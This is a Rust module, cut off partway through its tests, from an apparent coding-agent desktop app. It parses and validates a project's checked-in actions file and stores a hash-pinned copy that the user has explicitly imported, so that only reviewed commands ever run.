//! `.monocode/project.json`: a project's checked-in actions (Setup, Run, Check, Ship ...) and worktree settings.
//!
//! The format is general on purpose: any repository can carry one, and its actions become one-click buttons for Ash
//! and `actions.*` calls for a Lead (src/features/agent-app/model/agentApp.ts).
//!
//! Trust (the project file design notes): the file is read only from the project's MAIN checkout, never from a
//! worktree, so a branch from elsewhere can't add commands. Nothing in it runs until Ash imports it once, in Settings >
//! Worktrees. The import stores the exact text he reviewed, and every run uses that stored copy: a later edit, or
//! another branch checked out in the main checkout, changes nothing until he imports again.

use std::collections::BTreeMap;
use std::path::{Component, Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use tauri::{AppHandle, Manager};

use crate::fs::{expand_home, path_to_js};

/// Where the file lives, relative to the main checkout.
pub const PROJECT_FILE: &str = ".monocode/project.json";
const PROJECT_DIR: &str = ".monocode";
const MAX_FILE_BYTES: u64 = 64 * 1024;
const MAX_ACTIONS: usize = 24;
const MAX_BUILD_OUTPUT: usize = 20;
const MAX_VERIFY_CHECKS: usize = 8;
const MAX_GLOBS: usize = 40;
/// How long an action may run before it is stopped, unless it sets its own `timeoutSeconds`.
pub const DEFAULT_TIMEOUT_SECONDS: u64 = 15 * 60;
const MAX_TIMEOUT_SECONDS: u64 = 4 * 60 * 60;
/// Icons the app knows how to draw; anything else is refused so a typo shows at import.
pub const ICONS: &[&str] = &[
    "play", "setup", "check", "ship", "build", "test", "terminal", "clean",
];
/// The trust store, in the copy's own data folder (a dev copy never sees the daily app's imports).
const TRUST_FILE: &str = "project-files.json";

/// Build output the janitor may free when a project file names none. Each is deleted only if git ignores it and
/// tracks nothing inside it (src/worktree_janitor.rs).
pub const DEFAULT_BUILD_OUTPUT: &[&str] = &[
    "target",
    "node_modules",
    "dist",
    ".next",
    ".turbo",
    ".vite",
    "src-tauri/target",
];

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct ProjectFile {
    #[serde(rename = "$schema", default, skip_serializing_if = "Option::is_none")]
    pub schema: Option<String>,
    /// Format version. Only 1 exists.
    pub version: u32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// The repository's mainline, where finished work lands (`pm/pages-live` here). The worktree janitor calls a
    /// worktree merged when its commits are on this branch. Without it: the branch the main checkout has checked out.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub main_branch: Option<String>,
    #[serde(default)]
    pub actions: Vec<ProjectAction>,
    #[serde(default)]
    pub worktrees: WorktreeSettings,
    /// How this project proves a change (src-tauri/src/verify_stage.rs): its own checks for the folder that changed,
    /// and a real-path recipe for anything Ash would see. Like every action, nothing here runs until Ash imports
    /// this file, and only the imported text is ever run.
    #[serde(default)]
    pub verify: VerifySettings,
    /// Services, ports and env names for one stack per worktree (WP-87). Absent means this project is left alone.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stack: Option<crate::stack_decl::StackDecl>,
    /// WP-90: `"real"` lets a stack reach a real outside account. It can then only be started by
    /// the person, never by a crew turn. Absent (or `"emulated"`) keeps every service fake.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reaches: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct ProjectAction {
    /// Stable name for `actions.run` (lowercase letters, digits and hyphens).
    pub id: String,
    /// Button label.
    pub name: String,
    /// Shell command, run in the chosen checkout with MONOCODE_PROJECT_ROOT and MONOCODE_WORKTREE_PATH set.
    pub command: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub icon: Option<String>,
    /// Runs in every new worktree right after `git worktree add`. At most one action may set it.
    #[serde(default)]
    pub run_on_worktree_create: bool,
    /// With `runOnWorktreeCreate`: the chat's first turn waits for it (the default, unlike T3). `false` lets the
    /// agent start while it runs.
    #[serde(default = "default_hold")]
    pub hold: bool,
    /// Runs until stopped (a dev server): no timeout, and nothing waits for it.
    #[serde(default)]
    pub long_running: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub timeout_seconds: Option<u64>,
    /// Shown, and must be confirmed, before the app's button runs it (Ship).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub confirm: Option<String>,
}

fn default_hold() -> bool {
    true
}

impl ProjectAction {
    pub fn timeout_seconds(&self) -> Option<u64> {
        (!self.long_running).then(|| self.timeout_seconds.unwrap_or(DEFAULT_TIMEOUT_SECONDS))
    }
}

/// A project's own answer to "did this change work?" (src-tauri/src/verify_stage.rs). Both parts are optional: a
/// project with no recipe can be asked to verify, and the honest answer is that nothing was run.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct VerifySettings {
    /// The project's own checks, run once in every folder a change touched (the nearest folder up from each changed
    /// file that holds a package.json, Cargo.toml, pyproject.toml or go.mod).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub checks: Vec<VerifyCheck>,
    /// For anything Ash would see: a command that drives the real path and writes its verdict. The stage sets
    /// MONOCODE_VERIFY_VERDICT to a file the command must write ({"outcome": "passed"|"failed"|
    /// "couldNotExercise", "detail": "..."}). Exit 0 without that file is not a pass.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub real_path: Option<RealPathCheck>,
    /// Hivra WP-40 (firstmate/gates.rs): the completion gates a code brief gets when its first mate names none (`diff`,
    /// `checks`, `committed`, `ratchet`, `routes`). A code brief always gets `diff` and `checks` on top.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub gates: Vec<String>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct VerifyCheck {
    pub id: String,
    /// Plain-English name, shown with the result ("Web checks").
    pub name: String,
    pub command: String,
    /// The folder it runs in, relative to the checkout. It covers every change under it. Missing: the checkout root.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub dir: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub timeout_seconds: Option<u64>,
}

impl VerifyCheck {
    pub fn timeout_seconds(&self) -> u64 {
        self.timeout_seconds.unwrap_or(DEFAULT_TIMEOUT_SECONDS)
    }

    /// The checkout-relative folder this check runs in (`""` for the root, so a plain `starts_with` test works).
    pub fn dir(&self) -> &str {
        self.dir.as_deref().unwrap_or("")
    }
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct RealPathCheck {
    pub command: String,
    /// Checkout-relative globs of the files whose change a person would see (`src/**`, `*.html`). Empty: any change.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub applies_to: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub timeout_seconds: Option<u64>,
}

impl RealPathCheck {
    pub fn timeout_seconds(&self) -> u64 {
        self.timeout_seconds.unwrap_or(DEFAULT_TIMEOUT_SECONDS)
    }
}

/// A checkout-relative glob: no root, no `..`, no empty segment; `*`, `?` and `**` are the wildcards.
pub fn valid_glob(pattern: &str) -> bool {
    !pattern.is_empty()
        && pattern.len() <= 200
        && !pattern.contains('\\')
        && !pattern.contains('\0')
        && !Path::new(pattern).is_absolute()
        && pattern
            .split('/')
            .all(|segment| !segment.is_empty() && segment != "." && segment != "..")
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct WorktreeSettings {
    /// Folders, relative to a checkout, that "Free build output" may delete. Git must ignore each one.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub build_output: Vec<String>,
    /// Other ignored files a worktree may lose when it is removed (tool state that is recreated). Without them, an
    /// ignored file that isn't build output keeps the worktree.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub regenerable: Vec<String>,
}

impl ProjectFile {
    pub fn setup_action(&self) -> Option<&ProjectAction> {
        self.actions
            .iter()
            .find(|action| action.run_on_worktree_create)
    }

    pub fn action(&self, id: &str) -> Option<&ProjectAction> {
        self.actions.iter().find(|action| action.id == id)
    }

    /// What the janitor may free in this project's checkouts.
    pub fn build_output(&self) -> Vec<String> {
        if self.worktrees.build_output.is_empty() {
            default_build_output()
        } else {
            self.worktrees.build_output.clone()
        }
    }
}

pub fn default_build_output() -> Vec<String> {
    DEFAULT_BUILD_OUTPUT.iter().map(|s| s.to_string()).collect()
}

fn bounded(value: &str, what: &str, max: usize) -> Result<(), String> {
    if value.trim().is_empty() {
        return Err(format!("{what} must not be empty"));
    }
    if value.chars().count() > max {
        return Err(format!("{what} must be at most {max} characters"));
    }
    Ok(())
}

fn single_line(value: &str, what: &str) -> Result<(), String> {
    if value.chars().any(char::is_control) {
        return Err(format!("{what} must be one line of plain text"));
    }
    Ok(())
}

fn valid_id(id: &str) -> bool {
    let mut chars = id.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_lowercase() || c.is_ascii_digit())
        && id.len() <= 40
        && chars.all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

/// A branch name git accepts and the janitor can pass to git without quoting: no leading `-` or `/`, no `..`, no
/// empty segment, no `.lock` ending, nothing but letters, digits, `.`, `_`, `-` and `/`.
pub fn valid_branch_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 200
        && !name.starts_with('-')
        && !name.contains("..")
        && !name.ends_with(".lock")
        && !name.ends_with('.')
        && name
            .split('/')
            .all(|segment| !segment.is_empty() && !segment.starts_with('.'))
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/'))
}

/// A relative path that stays inside the checkout: no root, no `..`, no `.` tricks.
pub fn valid_relative_path(path: &str) -> bool {
    if path.is_empty() || path.len() > 200 || path.contains('\\') || path.contains('\0') {
        return false;
    }
    // `components()` quietly drops a `.` in the middle, so check the raw segments too.
    if path
        .split('/')
        .any(|segment| segment.is_empty() || segment == "." || segment == "..")
    {
        return false;
    }
    let path = Path::new(path);
    !path.is_absolute() && path.components().all(|c| matches!(c, Component::Normal(_)))
}

/// Parse and check a project file. Unknown fields are errors, so a typo never silently does nothing.
pub fn parse(text: &str) -> Result<ProjectFile, String> {
    let file: ProjectFile =
        serde_json::from_str(text).map_err(|error| format!("{PROJECT_FILE}: {error}"))?;
    validate(&file).map_err(|error| format!("{PROJECT_FILE}: {error}"))?;
    Ok(file)
}

pub fn validate(file: &ProjectFile) -> Result<(), String> {
    if file.version != 1 {
        return Err(format!(
            "version {} is not supported; this build reads version 1",
            file.version
        ));
    }
    if let Some(name) = &file.name {
        bounded(name, "name", 80)?;
        single_line(name, "name")?;
    }
    if let Some(branch) = &file.main_branch {
        if !valid_branch_name(branch) {
            return Err(format!(
                "mainBranch {branch:?} must be a plain git branch name (letters, digits, '.', '_', '-' and '/')"
            ));
        }
    }
    if file.actions.len() > MAX_ACTIONS {
        return Err(format!("at most {MAX_ACTIONS} actions are allowed"));
    }
    let mut seen = std::collections::HashSet::new();
    let mut setup = None;
    for action in &file.actions {
        if !valid_id(&action.id) {
            return Err(format!(
                "action id {:?} must be 1-40 lowercase letters, digits or hyphens",
                action.id
            ));
        }
        if !seen.insert(action.id.as_str()) {
            return Err(format!("action id {:?} is used twice", action.id));
        }
        let what = format!("action {:?}", action.id);
        bounded(&action.name, &format!("{what} name"), 60)?;
        single_line(&action.name, &format!("{what} name"))?;
        bounded(&action.command, &format!("{what} command"), 4000)?;
        if action.command.contains('\0') {
            return Err(format!("{what} command contains a NUL character"));
        }
        if let Some(description) = &action.description {
            bounded(description, &format!("{what} description"), 300)?;
        }
        if let Some(icon) = &action.icon {
            if !ICONS.contains(&icon.as_str()) {
                return Err(format!(
                    "{what} icon {icon:?} is not one of {}",
                    ICONS.join(", ")
                ));
            }
        }
        if let Some(confirm) = &action.confirm {
            bounded(confirm, &format!("{what} confirm"), 300)?;
        }
        if let Some(timeout) = action.timeout_seconds {
            if action.long_running {
                return Err(format!(
                    "{what} is longRunning, so it can't have timeoutSeconds"
                ));
            }
            if timeout == 0 || timeout > MAX_TIMEOUT_SECONDS {
                return Err(format!(
                    "{what} timeoutSeconds must be from 1 to {MAX_TIMEOUT_SECONDS}"
                ));
            }
        }
        if action.run_on_worktree_create {
            if action.long_running {
                return Err(format!(
                    "{what} can't both run on worktree creation and be longRunning"
                ));
            }
            if let Some(other) = setup.replace(action.id.as_str()) {
                return Err(format!(
                    "only one action may set runOnWorktreeCreate ({other:?} and {:?} both do)",
                    action.id
                ));
            }
        }
    }
    if file.worktrees.build_output.len() > MAX_BUILD_OUTPUT {
        return Err(format!(
            "worktrees.buildOutput has more than {MAX_BUILD_OUTPUT} entries"
        ));
    }
    if file.worktrees.regenerable.len() > MAX_BUILD_OUTPUT {
        return Err(format!(
            "worktrees.regenerable has more than {MAX_BUILD_OUTPUT} entries"
        ));
    }
    for (field, paths) in [
        ("buildOutput", &file.worktrees.build_output),
        ("regenerable", &file.worktrees.regenerable),
    ] {
        for path in paths {
            if !valid_relative_path(path) {
                return Err(format!(
                    "worktrees.{field} entry {path:?} must be a plain relative path inside the checkout"
                ));
            }
        }
    }
    validate_verify(&file.verify)?;
    if let Some(stack) = &file.stack {
        crate::stack_decl::validate(stack)?;
    }
    if let Some(reaches) = &file.reaches {
        if reaches != "emulated" && reaches != "real" {
            return Err(format!(
                "reaches {reaches:?} must be \"emulated\" or \"real\""
            ));
        }
    }
    if file.reaches.as_deref() == Some("real") && file.stack.is_none() {
        return Err("reaches is only meaningful with a stack".into());
    }
    Ok(())
}

fn validate_verify(verify: &VerifySettings) -> Result<(), String> {
    if verify.checks.len() > MAX_VERIFY_CHECKS {
        return Err(format!(
            "verify.checks has more than {MAX_VERIFY_CHECKS} entries"
        ));
    }
    let mut seen = std::collections::HashSet::new();
    for check in &verify.checks {
        if !valid_id(&check.id) {
            return Err(format!(
                "verify check id {:?} must be 1-40 lowercase letters, digits or hyphens",
                check.id
            ));
        }
        if !seen.insert(check.id.as_str()) {
            return Err(format!("verify check id {:?} is used twice", check.id));
        }
        let what = format!("verify check {:?}", check.id);
        bounded(&check.name, &format!("{what} name"), 60)?;
        single_line(&check.name, &format!("{what} name"))?;
        bounded(&check.command, &format!("{what} command"), 4000)?;
        if check.command.contains('\0') {
            return Err(format!("{what} command contains a NUL character"));
        }
        if let Some(dir) = &check.dir {
            if !valid_relative_path(dir) {
                return Err(format!(
                    "{what} dir {dir:?} must be a plain relative path inside the checkout"
                ));
            }
        }
        if let Some(description) = &check.description {
            bounded(description, &format!("{what} description"), 300)?;
        }
        if let Some(timeout) = check.timeout_seconds {
            if timeout == 0 || timeout > MAX_TIMEOUT_SECONDS {
                return Err(format!(
                    "{what} timeoutSeconds must be from 1 to {MAX_TIMEOUT_SECONDS}"
                ));
            }
        }
    }
    // Hivra WP-40: only gates from the fixed set.
    for gate in &verify.gates {
        if crate::firstmate::gates::GateKind::parse(gate).is_none() {
            return Err(format!(
                "verify.gates entry {gate:?} must be one of diff, checks, committed, ratchet, routes"
            ));
        }
    }
    if let Some(real) = &verify.real_path {
        bounded(&real.command, "verify.realPath command", 4000)?;
        if real.command.contains('\0') {
            return Err("verify.realPath command contains a NUL character".into());
        }
        if real.applies_to.len() > MAX_GLOBS {
            return Err(format!(
                "verify.realPath appliesTo has more than {MAX_GLOBS} entries"
            ));
        }
        for pattern in &real.applies_to {
            if !valid_glob(pattern) {
                return Err(format!(
                    "verify.realPath appliesTo entry {pattern:?} must be a plain relative glob inside the checkout"
                ));
            }
        }
        if let Some(timeout) = real.timeout_seconds {
            if timeout == 0 || timeout > MAX_TIMEOUT_SECONDS {
                return Err(format!(
                    "verify.realPath timeoutSeconds must be from 1 to {MAX_TIMEOUT_SECONDS}"
                ));
            }
        }
    }
    Ok(())
}

pub fn hash(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect()
}

// ---- the main checkout ----------------------------------------------------------------------------------------------

/// The main checkout of the repository that `cwd` belongs to (a worktree resolves to its main checkout).
pub fn main_checkout(cwd: &Path) -> Result<PathBuf, String> {
    if crate::chat_folder::is_blank(cwd) {
        return Err(crate::chat_folder::NEEDS_FOLDER.into());
    }
    let trees = crate::worktrees::list(cwd)?;
    let main = trees.first().ok_or("No working copies found")?;
    let main = PathBuf::from(&main.path);
    // A bare repository's first entry has no checkout, so no project file to read.
    match std::fs::symlink_metadata(main.join(".git")) {
        Ok(_) => {}
        Err(_) => return Err("This repository has no main checkout".into()),
    }
    crate::fs::canonical(main).map_err(|error| error.to_string())
}

/// What the main checkout holds right now.
#[derive(Clone, Debug, PartialEq)]
pub enum FileState {
    Missing,
    Invalid {
        error: String,
        hash: Option<String>,
    },
    Valid {
        hash: String,
        text: String,
        // Boxed: the parsed file (with its verify settings) is much larger than the other two states, and this enum
        // is passed around by value on every poll.
        file: Box<ProjectFile>,
    },
}

/// Read `<main>/.monocode/project.json`. Symbolic links are refused at both levels: the file must really be in the
/// main checkout.
pub fn read_main_file(main: &Path) -> FileState {
    let invalid = |error: String| FileState::Invalid { error, hash: None };
    let dir = main.join(PROJECT_DIR);
    match std::fs::symlink_metadata(&dir) {
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return FileState::Missing,
        Err(error) => return invalid(format!("{PROJECT_DIR}: {error}")),
        Ok(meta) if meta.file_type().is_symlink() => {
            return invalid(format!(
                "{PROJECT_DIR} is a symbolic link; the project file must be a real file in the main checkout"
            ))
        }
        Ok(meta) if !meta.is_dir() => return invalid(format!("{PROJECT_DIR} is not a folder")),
        Ok(_) => {}
    }
    let path = main.join(PROJECT_FILE);
    match std::fs::symlink_metadata(&path) {
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return FileState::Missing,
        Err(error) => return invalid(format!("{PROJECT_FILE}: {error}")),
        Ok(meta) if meta.file_type().is_symlink() => {
            return invalid(format!(
                "{PROJECT_FILE} is a symbolic link; the project file must be a real file in the main checkout"
            ))
        }
        Ok(meta) if !meta.is_file() => return invalid(format!("{PROJECT_FILE} is not a file")),
        Ok(meta) if meta.len() > MAX_FILE_BYTES => {
            return invalid(format!(
                "{PROJECT_FILE} is larger than {} KB",
                MAX_FILE_BYTES / 1024
            ))
        }
        Ok(_) => {}
    }
    let bytes = match std::fs::read(&path) {
        Ok(bytes) => bytes,
        Err(error) => return invalid(format!("{PROJECT_FILE}: {error}")),
    };
    let digest = hash(&bytes);
    let text = match String::from_utf8(bytes) {
        Ok(text) => text,
        Err(_) => {
            return FileState::Invalid {
                error: format!("{PROJECT_FILE} is not UTF-8 text"),
                hash: Some(digest),
            }
        }
    };
    match parse(&text) {
        Ok(file) => FileState::Valid {
            hash: digest,
            text,
            file: Box::new(file),
        },
        Err(error) => FileState::Invalid {
            error,
            hash: Some(digest),
        },
    }
}

// ---- trust ----------------------------------------------------------------------------------------------------------

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Trusted {
    pub hash: String,
    /// The exact text Ash imported. Runs parse this, never the file on disk.
    pub text: String,
    pub imported_at: u64,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct TrustStore {
    #[serde(default)]
    version: u32,
    #[serde(default)]
    projects: BTreeMap<String, Trusted>,
}

fn trust_path(data_dir: &Path) -> PathBuf {
    data_dir.join(TRUST_FILE)
}

/// The imported files. Only a store that isn't there is empty: one that can't be read or parsed is an error, because
/// saving over it would drop every other project's import.
fn load_store(data_dir: &Path) -> Result<TrustStore, String> {
    let path = trust_path(data_dir);
    match std::fs::read(&path) {
        Ok(bytes) => serde_json::from_slice(&bytes).map_err(|error| {
            format!(
                "{} can't be read ({error}), so nothing was changed. Move it aside to start again.",
                path.display()
            )
        }),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(TrustStore::default()),
        Err(error) => Err(format!("Couldn't read {}: {error}", path.display())),
    }
}

fn save_store(data_dir: &Path, store: &TrustStore) -> Result<(), String> {
    std::fs::create_dir_all(data_dir).map_err(|e| e.to_string())?;
    let path = trust_path(data_dir);
    // Its own name per save: two saves at once never write or rename each other's file.
    let temporary = data_dir.join(format!(
        ".{TRUST_FILE}.{}.{}",
        std::process::id(),
        uuid::Uuid::new_v4()
    ));
    let bytes = serde_json::to_vec_pretty(store).map_err(|e| e.to_string())?;
    std::fs::write(&temporary, bytes).map_err(|e| e.to_string())?;
    std::fs::rename(&temporary, path).map_err(|e| e.to_string())
}

fn key(main: &Path) -> String {
    path_to_js(main)
}

/// The imported copy, if any. A store that can't be read trusts nothing (the next import or forget says why).
pub fn trusted(data_dir: &Path, main: &Path) -> Option<Trusted> {
    load_store(data_dir).ok()?.projects.remove(&key(main))
}

/// The actions that may run for this project: the imported copy, or nothing.
pub fn trusted_file(data_dir: &Path, main: &Path) -> Option<ProjectFile> {
    trusted(data_dir, main).and_then(|trusted| parse(&trusted.text).ok())
}

fn now_ms() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

/// Import the main checkout's file, but only if it is still the one Ash reviewed (`expected_hash`).
pub fn import(data_dir: &Path, main: &Path, expected_hash: &str) -> Result<Trusted, String> {
    match read_main_file(main) {
        FileState::Valid { hash, text, .. } if hash == expected_hash => {
            let entry = Trusted {
                hash,
                text,
                imported_at: now_ms(),
            };
            let mut store = load_store(data_dir)?;
            store.version = 1;
            store.projects.insert(key(main), entry.clone());
            save_store(data_dir, &store)?;
            Ok(entry)
        }
        FileState::Valid { .. } => Err(format!(
            "{PROJECT_FILE} changed since you reviewed it. Review it again before importing."
        )),
        FileState::Invalid { error, .. } => Err(error),
        FileState::Missing => Err(format!("{PROJECT_FILE} is missing from the main checkout")),
    }
}

pub fn forget(data_dir: &Path, main: &Path) -> Result<(), String> {
    let mut store = load_store(data_dir)?;
    if store.projects.remove(&key(main)).is_some() {
        save_store(data_dir, &store)?;
    }
    Ok(())
}

// ---- status ---------------------------------------------------------------------------------------------------------

#[derive(Clone, Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ProjectFileStatus {
    /// The main checkout the file is read from.
    pub project_root: String,
    pub path: String,
    /// `none` (no file, nothing imported), `new` (a file that was never imported), `trusted` (the file is the
    /// imported one), `changed` (the file differs from, or lost, the imported one: the imported copy still runs),
    /// `invalid` (a broken file and nothing imported).
    pub state: &'static str,
    pub error: Option<String>,
    /// The file in the main checkout now, for review before an import.
    pub file_hash: Option<String>,
    pub file: Option<ProjectFile>,
    /// What runs.
    pub trusted_hash: Option<String>,
    pub trusted: Option<ProjectFile>,
    pub imported_at: Option<u64>,
}

pub fn status(data_dir: &Path, main: &Path) -> ProjectFileStatus {
    let current = read_main_file(main);
    let imported = trusted(data_dir, main);
    let imported_file = imported.as_ref().and_then(|t| parse(&t.text).ok());
    let (file_hash, file, error) = match &current {
        FileState::Missing => (None, None, None),
        FileState::Invalid { error, hash } => (hash.clone(), None, Some(error.clone())),
        FileState::Valid { hash, file, .. } => {
            (Some(hash.clone()), Some(file.as_ref().clone()), None)
        }
    };
    let state = match (&current, &imported) {
        (FileState::Missing, None) => "none",
        (FileState::Valid { .. }, None) => "new",
        (FileState::Invalid { .. }, None) => "invalid",
        (FileState::Valid { hash, .. }, Some(t)) if *hash == t.hash => "trusted",
        (_, Some(_)) => "changed",
    };
    let error = match (&current, &imported) {
        (FileState::Missing, Some(_)) => Some(format!(
            "{PROJECT_FILE} is no longer in the main checkout; the imported copy still runs until you forget it"
        )),
        _ => error,
    };
    ProjectFileStatus {
        project_root: path_to_js(main),
        path: path_to_js(&main.join(PROJECT_FILE)),
        state,
        error,
        file_hash,
        file,
        trusted_hash: imported.as_ref().map(|t| t.hash.clone()),
        trusted: imported_file,
        imported_at: imported.map(|t| t.imported_at),
    }
}

pub(crate) fn data_dir(app: &AppHandle) -> Result<PathBuf, String> {
    app.path().app_data_dir().map_err(|e| e.to_string())
}

#[tauri::command(async)]
pub async fn project_file_status(app: AppHandle, cwd: String) -> Result<ProjectFileStatus, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let main = main_checkout(&expand_home(&cwd))?;
        Ok(status(&data_dir(&app)?, &main))
    })
    .await
    .map_err(|e| e.to_string())?
}

/// Ash's explicit import, from Settings > Worktrees. Agents have no route to it.
#[tauri::command(async)]
pub async fn project_file_import(
    app: AppHandle,
    cwd: String,
    hash: String,
) -> Result<ProjectFileStatus, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let main = main_checkout(&expand_home(&cwd))?;
        let data = data_dir(&app)?;
        import(&data, &main, &hash)?;
        Ok(status(&data, &main))
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command(async)]
pub async fn project_file_forget(app: AppHandle, cwd: String) -> Result<ProjectFileStatus, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let main = main_checkout(&expand_home(&cwd))?;
        let data = data_dir(&app)?;
        forget(&data, &main)?;
        Ok(status(&data, &main))
    })
    .await
    .map_err(|e| e.to_string())?
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::fs::git_checked;

    pub(crate) struct Temp(pub PathBuf);
    impl Drop for Temp {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    pub(crate) fn temp(prefix: &str) -> Temp {
        let dir = std::env::temp_dir().join(format!("{prefix}-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        Temp(crate::fs::canonical(dir).unwrap())
    }

    pub(crate) fn commit(root: &Path, message: &str) {
        git_checked(
            root,
            &[
                "-c",
                "user.name=Test",
                "-c",
                "user.email=test@example.com",
                "-c",
                "commit.gpgsign=false",
                "commit",
                "--allow-empty",
                "-m",
                message,
            ],
        )
        .unwrap();
    }

    /// A repository at `<dir>/repo` with one commit on main.
    pub(crate) fn repo(dir: &Path) -> PathBuf {
        let root = dir.join("repo");
        std::fs::create_dir_all(&root).unwrap();
        git_checked(&root, &["init", "-b", "main"]).unwrap();
        commit(&root, "initial");
        root
    }

    const GOOD: &str = r#"{
      "version": 1,
      "name": "Example",
      "actions": [
        {"id": "setup", "name": "Setup", "command": "node scripts/setup-worktree.mjs", "icon": "setup", "runOnWorktreeCreate": true},
        {"id": "dev", "name": "Run dev", "command": "npm run dev", "icon": "play", "longRunning": true},
        {"id": "check", "name": "Check", "command": "npm run check", "timeoutSeconds": 3600},
        {"id": "ship", "name": "Ship", "command": "npm run ship", "confirm": "Replace the daily app?"}
      ],
      "worktrees": {"buildOutput": ["target", "node_modules"]}
    }"#;

    #[test]
    fn parses_a_general_project_file() {
        let file = parse(GOOD).unwrap();
        assert_eq!(file.actions.len(), 4);
        let setup = file.setup_action().unwrap();
        assert_eq!(setup.id, "setup");
        assert!(setup.hold, "hold defaults to true");
        assert_eq!(setup.timeout_seconds(), Some(DEFAULT_TIMEOUT_SECONDS));
        assert_eq!(file.action("dev").unwrap().timeout_seconds(), None);
        assert_eq!(file.action("check").unwrap().timeout_seconds(), Some(3600));
        assert_eq!(file.build_output(), vec!["target", "node_modules"]);
        assert!(file.stack.is_none());
        let minimal = parse(r#"{"version":1}"#).unwrap();
        assert!(minimal.actions.is_empty());
        assert_eq!(minimal.build_output(), default_build_output());
    }

    #[test]
    fn reaches_is_emulated_by_default_and_real_only_with_a_stack() {
        let stack = r#""stack":{"services":[{"name":"web","ports":[{"env":"PORT"}]}]}"#;
        let ordinary = parse(&format!(r#"{{"version":1,{stack}}}"#)).unwrap();
        assert!(ordinary.reaches.is_none());
        let emulated = parse(&format!(r#"{{"version":1,"reaches":"emulated",{stack}}}"#)).unwrap();
        assert_eq!(emulated.reaches.as_deref(), Some("emulated"));
        let real = parse(&format!(r#"{{"version":1,"reaches":"real",{stack}}}"#)).unwrap();
        assert_eq!(real.reaches.as_deref(), Some("real"));
        for (text, needle) in [
            (r#"{"version":1,"reaches":"internet"}"#, "emulated"),
            (
                r#"{"version":1,"reaches":"real"}"#,
                "only meaningful with a stack",
            ),
        ] {
            let error = parse(text).unwrap_err();
            assert!(error.contains(needle), "{text} -> {error}");
        }
    }

    #[test]
    fn refuses_files_that_would_do_something_unexpected() {
        let cases = [
            (r#"{"version":2}"#, "version 2"),
            (r#"{"version":1,"scripts":[]}"#, "unknown field"),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A","command":"x","runOnCreate":true}]}"#,
                "unknown field",
            ),
            (
                r#"{"version":1,"actions":[{"id":"Setup","name":"A","command":"x"}]}"#,
                "lowercase",
            ),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A","command":"x"},{"id":"a","name":"B","command":"y"}]}"#,
                "used twice",
            ),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A","command":"  "}]}"#,
                "must not be empty",
            ),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A\nB","command":"x"}]}"#,
                "one line",
            ),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A","command":"x","icon":"rocket"}]}"#,
                "icon",
            ),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A","command":"x","runOnWorktreeCreate":true},{"id":"b","name":"B","command":"y","runOnWorktreeCreate":true}]}"#,
                "only one action",
            ),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A","command":"x","runOnWorktreeCreate":true,"longRunning":true}]}"#,
                "longRunning",
            ),
            (
                r#"{"version":1,"actions":[{"id":"a","name":"A","command":"x","timeoutSeconds":0}]}"#,
                "timeoutSeconds",
            ),
            (
